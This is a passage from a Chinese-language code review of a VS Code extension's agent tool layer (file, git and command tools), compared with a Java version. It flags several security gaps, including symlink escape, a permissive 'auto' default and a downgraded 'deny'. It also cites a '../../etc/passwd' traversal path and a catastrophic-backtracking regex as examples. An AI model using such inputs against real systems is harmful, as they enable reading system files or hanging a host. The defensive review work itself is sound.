| `chat/token` | 425-427 | `appendToken(delta)` | `_run_task.emit_token`（`server.py:577`） |
| `chat/toolStart` | 428-430 | 系统行「[工具] X 执行中...」 | `on_tool_start`（`server.py:588`） |
| `chat/toolEnd` | 431-436 | 系统行「[工具] 完成/失败：summary」 | `on_tool_end`（`server.py:597`） |
| `chat/subagent` | 437-457 | 子代理开始/结束（别名 + 能力档 + 模型 + 耗时） | `server.py:744` |
| `chat/artifact` | 458-467 | 时间线一行「[交付物] [kind] 标题 · 作者」+ 状态行 | `_publish_artifact`（`server.py:709`） |
| `chat/finish` | 468-474 | 清任务 + 结束气泡 + 用量 + 就绪 | `server.py:628` |
| `chat/error` | 475-483 | 清任务 + 错误行 + 出错状态 | `server.py:639/644/650` |
| `chat/notice` | 484-486 | 系统行「[提示]」 | `on_notice`（`server.py:607`） |
| `chat/todos` | 487-492 | 整表替换清单 | `todos.py`（`server.py:702`） |
| `tool/invoke` | 493-497 | 交给 `ToolRunner` | `tools/remote.py`（`server.py:791`） |
| `agent/confirm` | 498-517 | 弹内联确认卡（预审 / MCP 两种标题） | `server.py:804` / `835` |

📌 **`chat/toolStart` 只用 `toolName`**（429 行）：Core 也发了 `args`（`server.py:588`），但两个壳的用法不同——IntelliJ 已用参数拼成 `read_file · src/… · running`（06 卷 §5.3），VS Code 仍是 `[工具] read_file 执行中...`。**同为「工具执行中」，两壳的细节程度不一样。**

📌 **子代理行带别名与能力档**：`label = (model ? \`${who}·${model}\` : who) + (capability ? \`[${capability}]\` : "")`（446 行），所以团队成员显示为 `全栈工程师·qwen2.5-7b[write]`；`actor` / `capability` 由 Core 从 `_current_member` 与 `SubagentTask.capability` 带出（04 卷 §9.14）。

⚠️ **五个通知没有分支**（`default:` 518-519 行）：

| 通知 | Core 会发吗 | 后果 |
|---|---|---|
| `chat/reasoning` | 会，每个思考增量一条（`server.py:583`） | **VS Code 不显示思考**；IntelliJ 已实现（08 卷 §17.1）。壳主动忽略，不影响会话历史与用量 |
| `ask/user` | **会**（`ide/hello` 已声明 `ask-user`） | **真 bug**：Core 会弹提问卡，壳没有 `case`，只能等 `ASK_TIMEOUT`（`server.py:63`，1800 s）超时后按「跳过」返回 |
| `ask/withdraw` | 同上 | 同上（壳本来就没画卡，无需收起） |
| `agent/ping` | 会，每 `HEARTBEAT_SECONDS` 一次（`server.py:227-229`） | 无（心跳本来就不需要 UI） |
| `index/progress` | 建索引时发（`server.py:427`） | 无进度显示（只有 `session/indexProgress` 有） |

📌 **声明了 `ask-user` 却不实现 UI，比不声明更糟**：不声明时 `_ask_via_shell` 会立刻返回 `None`，模型马上换策略；声明后 Core 会真的等 30 分钟。要么补一个输入卡，要么把 `ask-user` 从 `capabilities` 里去掉。

### 7.12 小助手与纯函数（523-669 行）

```ts
523    private replyConfirm(confirmId: string, approved: boolean): void {
524      void this.connection?.request("agent/confirmResult", { confirmId, approved });
525    }
```

⚠️ 见 §2.2：这是**唯一一个可能产生未处理 rejection 的地方**。

```ts
529    private appendUsage(raw: unknown): void {
530      if (!raw || typeof raw !== "object") {
531        return;
532      }
533      const usage = raw as Record<string, unknown>;
534      const input = Number(usage.in ?? 0);
535      const output = Number(usage.out ?? 0);
536      if (!input && !output) {
537        return;
538      }
539      this.panel.appendSystem(
540        `\n  本轮用量：${formatTokens(input)} 输入 / ${formatTokens(output)} 输出`);
541    }
```

📌 **字段名是 `in` / `out`**，不是 `input_tokens` / `output_tokens`。这是 Core `usage.py` 的约定（07 卷 §8）。

📌 **`formatTokens`（553-555 行）**：`<1000` 原样，否则 `1.2k` 一位小数。

最后是九个纯函数，它们把「Core 的宽松 JSON」变成「前端的强类型」：

| 函数 | 行 | 作用 | 关键细节 |
|---|---:|---|---|
| `describe` | 557-559 | `unknown` → 字符串 | 提取 `error.message` |
| `asArray` | 561-563 | `unknown` → 数组 | 非数组一律 `[]` |
| `toTodos` | 567-574 | → `TodoItem[]` | 缺 `status` 默认 `pending`，空 `content` 丢弃 |
| `toEntries` | 576-586 | → `HistoryEntry[]` | 缺 `id` 丢弃 |
| `toSearchEntries` | 590-601 | → `HistoryEntry[]` | `sessionId` → `id`，`snippet` 带上 |
| `toMemories` | 603-613 | → `PendingMemory[]` | 缺 `id` 丢弃 |
| `toTeams` | 617-626 | → `TeamEntry[]` | `members` 只留人数，缺 `name` 丢弃 |
| `toArtifacts` | 630-637 | → `ArtifactEntry[]` | 按投稿顺序，`kind` 缺省 `note` |
| `preapproveDetail` | 642-659 | 预审卡正文 | 计划 / 涉及文件 / 首个 diff 三段，任一可为空 |
| `formatSize` | 661-669 | 字节 → 可读串 | 1024 进制 |

📌 **除 `toArtifacts` 外，每个 `to*` 都做「缺关键字段就丢」**（黑板条目本来就没有 id）：因为后续所有操作都靠 `id` 定位，没有 id 的条目点了也没用。这是「在边界处丢弃脏数据」的典型做法——Core 可以随便加字段，壳只取它认识的。

---

## 8. `tools.ts`（521 行）：11 个工具的 TypeScript 版本

Core 把所有「需要 IDE 能力」的工具标成 `remote=True`，通过 `tool/invoke` 通知转给壳（06 卷 §5）。Java 侧用 11 个类实现（`agent/tools/*.java`，共 1,238 行），TypeScript 侧全部塞在 `ToolRunner` 一个类里。

### 8.1 常量表（12-25 行）

```ts
12  const execFileAsync = promisify(execFile);
13  const MAX_FILE_BYTES = 512 * 1024;
14  const MAX_LIST_ENTRIES = 300;
15  const MAX_SEARCH_RESULTS = 50;
16  const MAX_DIFF_CHARS = 20000;
17  const DEFAULT_COMMAND_TIMEOUT_SEC = 120;
18  const MAX_COMMAND_TIMEOUT_SEC = 600;
19  // Keep the tail of long output: failures sit at the end.
20  // 长输出保留尾部：失败信息都在末尾。
21  const MAX_OUTPUT_CHARS = 8000;
22  const HEAD_OUTPUT_CHARS = 3200;
23  const MAX_CAPTURE_BYTES = 2 * 1024 * 1024;
24  const MAX_DIAGNOSTICS = 50;
25  const SKIP_DIRS = new Set([".git", "node_modules", "target", "dist", "out", "build", ".idea"]);
```

| 常量 | 值 | 与 Java 对照 |
|---|---|---|
| `MAX_FILE_BYTES` | 512 KB | 同（`FileText` 上限） |
| `MAX_LIST_ENTRIES` | 300 | 同 |
| `MAX_SEARCH_RESULTS` | 50（可调至 200） | 同 |
| `MAX_DIFF_CHARS` | 20,000 | Java 用行数上限 |
| 命令超时 | 默认 120s，上限 600s | 同 |
| 输出上限 | 8,000 字符（头 3,200 + 尾 4,800） | 同结构 |
| 捕获上限 | 2 MB | Java 用 `ProcessBuilder` 读流，无硬上限 |
| 诊断上限 | 50 | 同 |
| 跳过目录 | 7 个 | Java 用 `.gitignore` + 内置表 |

📌 **`HEAD_OUTPUT_CHARS = 3200` 的存在理由**（509-510 行注释）：命令输出开头通常是命令回显/编译进度，**真正的错误在最后**。所以压缩时保留头 3,200 + 尾 4,800，中间省略。

### 8.2 数据形状与入口（27-62 行）

```ts
36  interface ToolRequest {
37    toolCallId?: string;
38    toolName?: string;
39    params?: Record<string, unknown>;
40    // Effective permission for this call, computed by the Core (auto/confirm/deny).
41    // Core 为本次调用计算出的生效权限；run_command 会按它决定是否弹窗。
42    permission?: string;
43  }
```

```ts
45  export class ToolRunner {
46    private readonly snapshots = new Map<string, string>();
47
48    constructor(private readonly projectRoot: string) {}
49
50    async onToolInvoke(request: ToolRequest, connection: RpcConnection): Promise<void> {
51      const toolCallId = request.toolCallId ?? "";
52      const toolName = request.toolName ?? "";
53      const args = request.params ?? {};
54      let content: string;
55      try {
56        content = await this.run(toolName, args, request.permission ?? "auto");
57        connection.notify("tool/result", { toolCallId, ok: true, result: content });
58      } catch (error) {
59        const message = error instanceof Error ? error.message : String(error);
60        connection.notify("tool/result", { toolCallId, ok: false, error: message });
61      }
62    }
```

📌 **`permission ?? "auto"` 默认给 `auto`**：这是一个**宽松兜底**——如果 Core 忘了带 `permission`，`run_command` 会跳过确认直接执行。安全性完全依赖 Core 一定带这个字段（`permissions.py` 确实带，06 卷 §4）。更安全的默认值是 `"confirm"`。

📌 **`tool/result` 永远是 notification**（无 `id`）：Core 用 `self._pending_tools.pop(tool_call_id)` 配对（`server.py:351-353`），不等回包。

📌 **`result` 是纯字符串**：Core 的 `ToolResult.content` 是 `Any`，Java 侧有的工具返回 JSON 字符串（如 `diagnostics`），两边一致。

### 8.3 `run()` 路由（64-95 行）

```ts
69      switch (toolName) {
70        case "read_file":       return this.readFile(args);
72        case "list_dir":        return this.listDir(args);
74        case "search_code":     return this.searchCode(args);
76        case "git_log":         return this.gitLog(args);
78        case "git_diff":        return this.gitDiff(args);
80        case "write_file":      return this.writeFile(args);
82        case "edit_file":       return this.editFile(args);
84        case "delete_file":     return this.deleteFile(args);
86        case "revert_file":     return this.revertFile(args);
88        case "run_command":     return this.runCommand(args, permission);
90        case "diagnostics":     return this.diagnostics(args);
92        default:
93          throw new Error(`未知工具: ${toolName}`);
94      }
```

11 个工具与 Java 一一对应：

| 工具 | Java 实现 | 权限 | 备注 |
|---|---|---|---|
| `read_file` | `FileTools` | auto | 带行号输出 |
| `list_dir` | `FileTools` | auto | 目录加 `/` |
| `search_code` | `SearchTools` | auto | JS 正则 |
| `git_log` | `GitTools` | auto | 日报核心 |
| `git_diff` | `GitTools` | auto | 截断 20k |
| `write_file` | `EditTools` | confirm | 总是弹 diff |
| `edit_file` | `EditTools` | confirm | 总是弹 diff |
| `delete_file` | `EditTools` | confirm | 弹确认 |
| `revert_file` | `EditTools` | auto | 用快照回退 |
| `run_command` | `CommandTools` | auto/confirm/deny | 看白名单 |
| `diagnostics` | `DiagnosticsTools` | auto | JSON 输出 |

📌 **`write_file` / `edit_file` / `delete_file` 在 TypeScript 侧不读 `permission`**：它们**无条件**调 `confirmEdit` / `confirmAction`（`tools.ts:314`、`345`、`359`），只受 `autoAcceptEdits` 设置控制。也就是说 Core 算出的「auto」对这三个工具**完全失效**。

🔁 **Java 侧不同**：`EditTools.writeFile(args, needsApproval)`、`editFile(args, needsApproval)`、`deleteFile(args, needsApproval)` 都带一个布尔参数（`EditTools.java:45`、`96`、`126`），由调度器按权限传入——`auto` 模式下**不弹窗直接写**。

所以同一个 `write_file`，IntelliJ 里可能静默完成，VS Code 里一定弹 diff（除非用户开了 `autoAcceptEdits`）。在「模型连续改 10 个文件」的场景下，这个差异非常明显。

### 8.4 路径安全：`resolvePath()`（99-110 行）

```ts
 99    private resolvePath(raw: unknown): string {
100      const text = typeof raw === "string" ? raw.trim() : "";
101      if (!text) {
102        throw new Error("缺少参数 path");
103      }
104      const root = resolve(this.projectRoot);
105      const candidate = resolve(isAbsolute(text) ? text : resolve(root, text));
106      if (candidate !== root && !candidate.startsWith(root + sep)) {
107        throw new Error("路径无效或越出项目根目录");
108      }
109      return candidate;
110    }
```

四步：取字符串 → 解析相对/绝对 → **`resolve` 规范化掉 `..`** → 前缀校验。

📌 **`resolve` 先于校验**：`../../etc/passwd` 会先被规范化成 `/etc/passwd`，再被前缀拦住。顺序错了（先校验后 resolve）就能用 `../` 绕过。

📌 **根目录本身也允许**（`candidate === root`）：否则 `list_dir({path:"."})` 会被拒。

⚠️ **Windows 盘符大小写敏感**：`candidate.startsWith(root + sep)` 是**字节级比较**。若 `projectRoot` 是 `D:\Learn\repo`（VS Code 返回的原始大小写），而模型给的路径是 `d:/learn/repo/src`，`resolve` 会保留模型给的大小写，`startsWith` 失败 → **误拒**。Windows 文件系统本身不区分大小写。

⚠️ **不解析 junction / symbol link**：项目内一个指向 `C:\Windows` 的目录链接，`resolve` 不会展开它，前缀校验通过，**读写会越界**。Java 的 `FileTools.resolve` 也只做 `normalize()` + `startsWith(base)`（`FileTools.java:98-103`），同样不展开链接——**这是两端共有的漏洞**。

真正的差异在大小写：Java 的 `Path.startsWith` 在 Windows 上按文件系统语义逐段比较（**不区分大小写**），TypeScript 的字符串前缀比较**区分大小写**。所以只有 VS Code 会因为盘符/目录名大小写不一致而误拒。

### 8.5 四个通用帮手（112-164 行）

```ts
112    private relativeLabel(path: string): string {
113      return relative(resolve(this.projectRoot), path).split(sep).join("/") || basename(path);
114    }
```

- 统一用 `/` 分隔：模型看到的路径与 Linux 习惯一致，避免 `\` 在 JSON 里转义混乱。
- `|| basename(path)`：当 `path === root` 时 `relative` 返回 `""`，回退到目录名。

```ts
116    private async readText(path: string): Promise<string> {
117      const stat = await fs.stat(path);
118      if (stat.size > MAX_FILE_BYTES) {
119        throw new Error(`文件过大（${stat.size} 字节），请用 start_line/end_line 指定范围`);
120      }
121      return fs.readFile(path, "utf-8");
122    }
```

⚠️ **错误提示与实际能力矛盾**：它让模型「用 start_line/end_line 指定范围」，但 `readFile()`（168-170 行）是**先 `readText()` 再切片**——大文件在 `readText` 就被拦了，带 `start_line` 也没用。模型会反复重试同一个大文件。

📌 **Java 侧一模一样**：`FileTools.readFile` 也是先 `Files.size` 判 512 KB、再给出同一句建议（`FileTools.java:40-43`）。**两端都没有真正的分块读**，这条提示是错的。

🔁 **编码处理是两边最大的差异**：Java 走 `FileText.read(path)`，会探测 GBK / UTF-16 并在末尾附一句「文件编码 X，已按原编码解码」（`FileTools.java:44-64`）；TypeScript 无条件 `fs.readFile(path, "utf-8")`，GBK 文件会读出一堆 `�`。

```ts
124    private numberArg(args, key): number | undefined {
125      const value = args[key];
126      const parsed = typeof value === "number" ? value : Number(value);
127      return Number.isFinite(parsed) ? parsed : undefined;
128    }
```

📌 **`Number("") === 0`**：若模型传 `start_line: ""`，会得到 `0`，再被 `Math.max(1, 0)` 兜成 1。意外但无害。

```ts
135    private async git(argsList: string[]): Promise<string> {
136      try {
137        const { stdout } = await execFileAsync("git", argsList, {
138          cwd: this.projectRoot,
139          maxBuffer: 8 * 1024 * 1024,
140        });
141        return stdout;
142      } catch (error) {
143        const message = error instanceof Error ? error.message : String(error);
144        throw new Error(`git ${argsList[0]} 失败: ${message}`);
145      }
146    }
```

📌 **`execFile` 而非 `exec`**：参数以数组传入，**不经过 shell 解释**，所以路径里的空格/引号不需要转义，也不存在命令注入。`run_command` 才用 shell（因为它就是要执行命令行）。

### 8.6 重要细节：`persist()` 与 `flushDocuments()`（148-164 行）

```ts
148    private async persist(path: string, content: string): Promise<void> {
149      await fs.mkdir(dirname(path), { recursive: true });
150      await fs.writeFile(path, content, "utf-8");
151      const document = vscode.workspace.textDocuments.find(
152        (doc) => doc.uri.fsPath === path,
153      );
154      if (document?.isDirty) {
155        await document.save();
156      }
157    }
158
159    // Persist unsaved editor buffers so the agent never overwrites user edits.
160    // 先把未保存的编辑器内容落盘，避免覆盖用户正在编辑的内容。
161    private async flushDocuments(): Promise<void> {
162      const dirty = vscode.workspace.textDocuments.filter((doc) => doc.isDirty);
163      await Promise.all(dirty.map((doc) => doc.save()));
164    }
```

正确顺序应该是「**先 flush 编辑器，再写磁盘**」：

1. `flushDocuments()` 把用户未保存的编辑器内容落盘；
2. 再读 `before`；
3. 弹 diff 让用户确认；
4. 写新内容。

实际实现也是这样调的（`writeFile` 312 行、`editFile` 329 行、`deleteFile` 355 行）。但 `persist()` 里**又**多做了一步「如果文档还脏，就保存」（154-156 行）——这一步的方向是反的：文件已经被新内容覆盖，此时再 `document.save()` 会把**内存里的旧内容写回去**，抹掉刚刚写入的代理修改。

⚠️ **触发条件**：`flushDocuments()` 与 `persist()` 之间（中间隔着 `confirmEdit` 的模态弹窗，可能长达几十秒）用户又改了文件。此时 `document.isDirty === true` → `persist` 先写新内容 → 再 `save()` 把脏 buffer 写回 → 代理修改丢失。因为弹窗期间编辑器就在用户手上，**这个窗口是真实存在的**。

⚠️ **`fs.writeFile(..., "utf-8")` 会把非 UTF-8 文件永久性地烧掉**：GBK 文件被当成 UTF-8 读出来就是一堆 `�`，再以 UTF-8 写回，原字节已经不可逆地丢失。

Java 侧不存在这个问题：`EditTools` 写入走 `FileText.write(path, newContent, previous)`，其中 `previous` 是**写入前解码得到的 `FileText.Decoded`**，里面带着 charset 与 BOM 信息（`EditTools.java:42`、`54`、`102`）——改完再写回去仍然是 GBK，连 BOM 都保留。

📌 这也解释了 `EditTools` 为何有一个 `readDecodedOrNull()`（L166-172）：**写工具必须拿到原编码，否则不能安全落盘**。TypeScript 版本没有这个概念，所以它只能处理 UTF-8 项目。

### 8.7 `read_file`（168-188 行）

```ts
168    private async readFile(args: Record<string, unknown>): Promise<string> {
169      const path = this.resolvePath(args.path);
170      const text = await this.readText(path);
171      if (!text) return "（空文件）";
172      const lines = text.split(/\r?\n/);
173      if (lines.length > 0 && lines[lines.length - 1] === "") {
174        lines.pop();
175      }
176      const start = Math.max(1, this.numberArg(args, "start_line") ?? 1);
177      const end = Math.min(lines.length, this.numberArg(args, "end_line") ?? lines.length);
178      if (start > lines.length || start > end) {
179        return `（无匹配行；文件共 ${lines.length} 行）`;
180      }
181      const output: string[] = [];
182      for (let index = start; index <= end; index += 1) {
183        output.push(`${index}→${lines[index - 1]}`);
184      }
185      return output.join("\n");
186    }
```

📌 **行号格式 `N→内容`**：与 Java 完全一致（06 卷 §2），测试里叫「arrow 格式」。这个箭头是**给模型看的**，模型引用行号时依赖它。

📌 **`\.split(/\r?\n/)` + 去尾空行**：与 `Files.readAllLines` 语义对齐（`FileText.splitLines` 注释也是这么写的）。

⚠️ **CRLF 文件上的 `edit_file` 会全军覆没**：`read_file` 把 `\r\n` 规整成了 `\n`，模型照抄回来的 `old_string` 是 LF 风格；而 `editFile` 用 `fs.readFile(...)` 拿到的是**原始 CRLF**，`before.indexOf(oldText)` 直接返 -1。

这是 **Java 与 TypeScript 共有的问题**（`EditTools.java:84` 也是 `oldContent.indexOf(oldText)`），只在「工作区文件是 CRLF」时出现（Windows + `core.autocrlf=true` 的默认配置）。

### 8.8 `list_dir`（190-198 行）

```ts
190    private async listDir(args: Record<string, unknown>): Promise<string> {
191      const dir = args.path ? this.resolvePath(args.path) : resolve(this.projectRoot);
192      const entries = await fs.readdir(dir, { withFileTypes: true });
193      const names = entries
194        .sort((left, right) => left.name.localeCompare(right.name))
195        .slice(0, MAX_LIST_ENTRIES)
196        .map((entry) => (entry.isDirectory() ? `${entry.name}/` : entry.name));
197      return names.length > 0 ? names.join("\n") : "（空目录）";
198    }
```

📌 **`localeCompare` 按当前 locale 排序**：中文目录会按拼音/笔画排，与 `Array.sort` 的码点序不同。Java 用 `String.compareTo`（码点序）。**同一目录在两个壳里的顺序可能不一样**。

⚠️ **截断无提示**：超过 300 项直接 `slice`，返回结果里没有「还有 N 项被隐藏」。模型会以为目录就这么多。**Java 侧也一样静默截断**（`FileTools.java:81-85`），只是排序用文件名码点序而非 locale 序。

### 8.9 `search_code`（200-264 行）：手写递归 grep

```ts
200    private async searchCode(args: Record<string, unknown>): Promise<string> {
201      const pattern = this.stringArg(args, "pattern");
202      if (!pattern) throw new Error("缺少参数 pattern");
203      let expression: RegExp;
204      try {
205        expression = new RegExp(pattern, "u");
206      } catch (error) {
207        throw new Error(`正则表达式无效: ${String(error)}`);
208      }
...
212      const limit = Math.min(200, this.numberArg(args, "max_results") ?? MAX_SEARCH_RESULTS);
...
215      const walk = async (directory: string): Promise<void> => {
216        if (results.length >= limit) return;
217        const entries = await fs.readdir(directory, { withFileTypes: true });
218        for (const entry of entries) {
219          if (results.length >= limit) return;
224          if (entry.name.startsWith(".") && entry.isDirectory()) continue;
227          const fullPath = resolve(directory, entry.name);
228          if (entry.isDirectory()) {
229            if (!SKIP_DIRS.has(entry.name)) await walk(fullPath);
230            continue;
231          }
234          if (!entry.isFile()) continue;
...
239            const stat = await fs.stat(fullPath);
240            if (stat.size > MAX_FILE_BYTES) continue;
243            text = await fs.readFile(fullPath, "utf-8");
...
247          if (text.includes("\u0000")) continue;
250          const lines = text.split(/\r?\n/);
251          for (let index = 0; index < lines.length; index += 1) {
252            if (expression.test(lines[index])) {
253              results.push(`${this.relativeLabel(fullPath)}:${index + 1}: ${lines[index].trim().slice(0, 200)}`);
254              if (results.length >= limit) return;
255            }
256          }
```

| 方面 | 行为 |
|---|---|
| 引擎 | JavaScript `RegExp`（**不是 ripgrep**） |
| 标志 | 只有 `u`，**没有 `i`**（大小写敏感） |
| 目录过滤 | 跳过所有 `.` 开头的目录 + `SKIP_DIRS` 7 个 |
| 文件过滤 | 只看 `isFile()`、≤512 KB、无 `\0` |
| 输出 | `相对路径:行号: 去空白的 200 字符` |
| 上限 | `min(200, max_results ?? 50)` |

📌 **零依赖**：`package.json` 的 `devDependencies` 只有 `@types/*` 和 `typescript`（L156-160），**运行时没有任何第三方包**。所以搜索只能手写。

⚠️ **不读 `.gitignore`**：`node_modules`/`target` 靠硬编码名单跳过，但 `venv/`、`.venv/`（以点开头，能跳）、`__pycache__/`、`.next/`、`coverage/` 等都不在名单里。在一个装了 `node_modules` 的子项目里，`search_code` 会扫到 30 万个文件。

🔁 **Java 侧也不读 `.gitignore`**，但两边的过滤策略差得很远：

| 维度 | Java `SearchTools` | TypeScript `searchCode` |
|---|---|---|
| 目录黑名单 | 8 个（多 `.gradle`）（L23-24） | 7 个（L25） |
| 点目录 | **不跳**（`Files.walk` 全量） | **全跳**（L224） |
| 扩展名黑名单 | 23 个二进制扩展（L25-28） | 无，靠 NUL 探测（L247） |
| 大小上限 | 1 MB（L22） | 512 KB（L240） |
| 编码 | `FileText.decode`（GBK/UTF-16 可搜） | 只认 UTF-8 |
| 单行输出 | 原文 `trim()`，不限长（L94） | `trim().slice(0,200)`（L253） |
| 执行位置 | 池线程 | **扩展宿主事件循环** |

⚠️ **正则回溯可以卡死共享事件循环**：用户在 JS 里写 `(a+)+$` 这种灾难性回溯的模式，会让**整个扩展宿主**（包括 UI 渲染、RPC 读循环）卡住。Java 侧在池线程执行，且用 `java.util.regex` 有回溯限制，不会拖垮 EDT。

### 8.10 `git_log`（266-296 行）：日报的数据源

```ts
266    private async gitLog(args: Record<string, unknown>): Promise<string> {
267      const start = this.stringArg(args, "start_date");
268      const end = this.stringArg(args, "end_date");
269      if (!start || !end) {
270        throw new Error("缺少参数 start_date / end_date（yyyy-MM-dd）");
271      }
272      if (end < start) {
273        throw new Error("end_date 早于 start_date");
274      }
275      const nextDay = new Date(`${end}T00:00:00Z`);
276      nextDay.setUTCDate(nextDay.getUTCDate() + 1);
277      const until = nextDay.toISOString().slice(0, 10);
278      const output = await this.git([
279        "log",
280        `--since=${start} 00:00:00`,
281        `--until=${until} 00:00:00`,
282        "--date=short",
283        "--pretty=format:%h|%an|%ad|%s",
284      ]);
...
290        .map((line) => {
291          const [hash, author, date, ...rest] = line.split("|");
292          return `${hash}  ${date}  ${author}\n    ${rest.join("|")}`;
293        })
294        .join("\n");
```

📌 **`end` 当天必须包含**：`--until` 是**排他**的（不含该时刻），所以先算 `end + 1 天`，再让 `--until` 落在次日 00:00（278-281 行）。

📌 **`...rest` 接收 subject 里的 `|`**（291-292 行）：`feat: add a|b` 这种提交不会被截断。

📌 **`--date=short` + `%ad`**：日期格式固定 `yyyy-MM-dd`，不随系统 locale 变。

⚠️ **非法日期会静默产出错误结果**：`new Date("2026-13-01T00:00:00Z")` 得到 `Invalid Date`，`toISOString()` 会**抛 `RangeError`**——这一行抛出的异常被 `onToolInvoke` 捕获成工具失败，信息是 `Invalid time value`，模型看不懂。Java 侧用 `LocalDate.parse` 并校验，会给出可读错误。

### 8.11 `git_diff`（298-307 行）

```ts
298    private async gitDiff(args: Record<string, unknown>): Promise<string> {
299      const path = this.stringArg(args, "path");
300      const output = await this.git(path ? ["diff", "--", path] : ["diff"]);
301      if (!output.trim()) return "（无未提交变更）";
302      return output.length > MAX_DIFF_CHARS
303        ? `${output.slice(0, MAX_DIFF_CHARS)}\n...(已截断)`
304        : output;
305    }
```

⚠️ **`path` 没过 `resolvePath`**（299 行）：`git_diff({path: "../../outside"})` 会把它原样交给 `git diff -- ../../outside`。因为 `--` 后面是 **git 的路径参数**，git 会在仓库内解析，所以实际无法越出仓库；但可以指向仓库外的绝对路径（git 会报 `fatal: ... is outside repository`）。**不是安全漏洞，但行为不一致**。

### 8.12 `write_file` / `edit_file`（309-351 行）

```ts
309    private async writeFile(args: Record<string, unknown>): Promise<string> {
310      const path = this.resolvePath(args.path);
311      const content = this.stringArg(args, "content");
312      await this.flushDocuments();
313      const before = await fs.readFile(path, "utf-8").catch(() => "");
314      if (!(await confirmEdit(this.relativeLabel(path), before, content))) {
315        throw new Error(`用户拒绝：未写入 ${this.relativeLabel(path)}`);
316      }
317      this.snapshots.set(path, before);
318      await this.persist(path, content);
319      return `已写入 ${this.relativeLabel(path)}（${content.length} 字符）`;
320    }
```

```ts
322    private async editFile(args: Record<string, unknown>): Promise<string> {
323      const path = this.resolvePath(args.path);
324      const oldText = this.stringArg(args, "old_string");
325      const newText = this.stringArg(args, "new_string");
326      if (!oldText) throw new Error("old_string 不能为空");
329      await this.flushDocuments();
330      const before = await fs.readFile(path, "utf-8").catch(() => {
331        throw new Error(`文件不存在: ${this.relativeLabel(path)}`);
332      });
333      const first = before.indexOf(oldText);
334      if (first < 0) {
335        throw new Error("未找到 old_string，请先用 read_file 确认原文（注意缩进与换行）");
336      }
337      const replaceAll = args.replace_all === true;
338      if (!replaceAll && before.indexOf(oldText, first + 1) >= 0) {
339        throw new Error("old_string 匹配到多处，请提供更长的上下文或设置 replace_all=true");
340      }
341      const after = replaceAll
342        ? before.split(oldText).join(newText)
343        : before.slice(0, first) + newText + before.slice(first + oldText.length);
345      if (!(await confirmEdit(this.relativeLabel(path), before, after))) {
346        throw new Error(`用户拒绝：未修改 ${this.relativeLabel(path)}`);
347      }
348      this.snapshots.set(path, before);
349      await this.persist(path, after);
350      return `已修改 ${this.relativeLabel(path)}${replaceAll ? "（替换全部匹配）" : "（1 处）"}`;
351    }
```

| 细节 | `write_file` | `edit_file` |
|---|---|---|
| 目标必须已存在 | 否（`catch(() => "")`） | **是**（抛 `文件不存在`） |
| 需要 `old_string` | 否 | 是（空串直接拒） |
| 多处匹配 | 不适用 | 不 `replace_all` 就拒 |
| 确认 | `confirmEdit` | `confirmEdit` |
| 快照 | `snapshots.set(path, before)` | 同 |
| 返回 | `已写入 X（N 字符）` | `已修改 X（1 处 / 替换全部匹配）` |

📌 **错误文案与 Java 逐字一致**（`EditTools.java:86-89`）：`未找到 old_string，请先用 read_file 确认原文（注意缩进与换行）` / `old_string 匹配到多处，请提供更长的上下文或设置 replace_all=true`。这是**刻意的**：模型在两端的 prompt 里看到同一句话，重试策略一致。

⚠️ **`snapshots` 只有一层**（317、348 行）：同一个文件改两次，`set` 覆盖，`revert_file` 只能回到**最后一次修改前**。Java 的 `FileSnapshots` 也是单层（06 卷 §3.5），两端一致。

⚠️ **没有写锁**：Java 用 `ProjectWriteGate` 串行化写操作（公平锁 + 模态框期间持锁，08 卷 §13.2）；TypeScript 完全没锁。因为 VS Code 壳只有一个会话，并发写几乎不会发生——**但如果用户在两个 VS Code 窗口打开同一仓库，两个扩展宿主会同时写**，两个 diff 弹窗还会叠在一起。

### 8.13 `delete_file` / `revert_file`（353-376 行）

```ts
353    private async deleteFile(args: Record<string, unknown>): Promise<string> {
354      const path = this.resolvePath(args.path);
355      await this.flushDocuments();
356      const before = await fs.readFile(path, "utf-8").catch(() => {
357        throw new Error(`文件不存在: ${this.relativeLabel(path)}`);
358      });
359      if (!(await confirmAction(`Agent 想要删除 ${this.relativeLabel(path)}，是否允许？`))) {
360        throw new Error(`用户拒绝：未删除 ${this.relativeLabel(path)}`);
361      }
362      this.snapshots.set(path, before);
363      await fs.unlink(path);
364      return `已删除 ${this.relativeLabel(path)}（可用 revert_file 恢复）`;
365    }
```

📌 **先读全文再删（356 行）**：不是为了校验，而是为了**留下快照**。`revert_file` 靠 `persist(path, previous)` 重建文件（374 行）。

⚠️ **二进制文件删不掉**：`fs.readFile(path, "utf-8")` 对二进制会返回乱码字符串（不抛错），所以能删；但 `revert_file` 写回去的已经是乱码文本，**二进制内容无法恢复**。

🔁 Java 侧也是先把内容当文本读（`readOrEmpty` → `FileText.read`，`EditTools.java:124`、`178-181`），二进制同样不可逆；区别在于 Java 回写时**沿用原编码与 BOM**（`FileText.write(path, previous, decoded)`，L158），而 TypeScript 一律写 UTF-8。

### 8.14 `run_command`（380-406 行）

```ts
380    private async runCommand(args: Record<string, unknown>, permission: string): Promise<string> {
381      const command = this.stringArg(args, "command").trim();
382      if (!command) throw new Error("缺少参数 command");
383      const cwd = args.cwd ? this.resolvePath(args.cwd) : resolve(this.projectRoot);
384      const stat = await fs.stat(cwd).catch(() => null);
385      if (!stat?.isDirectory()) {
386        throw new Error(`工作目录不存在: ${this.relativeLabel(cwd)}`);
387      }
388      const requested = this.numberArg(args, "timeout_sec") ?? DEFAULT_COMMAND_TIMEOUT_SEC;
389      const timeoutSec = Math.min(
390        MAX_COMMAND_TIMEOUT_SEC,
391        Math.max(1, Math.floor(requested)),
392      );
393      // Only allowlisted commands arrive as "auto"; everything else asks first.
394      // 只有白名单内的命令会是 auto，其余都会先弹窗确认。
395      if (permission !== "auto") {
396        const approved = await confirmAction(
397          `Agent 请求在 ${this.relativeLabel(cwd)} 执行命令：\n\n${command}\n\n允许后才会运行。`,
398        );
399        if (!approved) {
400          throw new Error(`用户拒绝：未执行命令 ${command}`);
401        }
402      }
403      return this.exec(command, cwd, timeoutSec);
404    }
```

📌 **`permission !== "auto"` 就弹窗**：包括 Core 算出的 `"deny"`。**`deny` 应该直接拒绝，而不是「问用户要不要」**——用户点「允许」就能绕过 Core 的危险命令拒绝。这是一个**安全语义错位**：Core 的 `deny` 是强制的，壳却把它降级成了「问一下」。

⚠️ 上面这条如果真的生效会很难查：Core 侧 `deny` 的工具根本不会到 `tool/invoke`（`permissions.py` 直接返回失败），所以实际不可触发；但**壳层缺少一道独立防线**，一旦 Core 的权限逻辑有 bug，Shell 不会兜底。

```ts
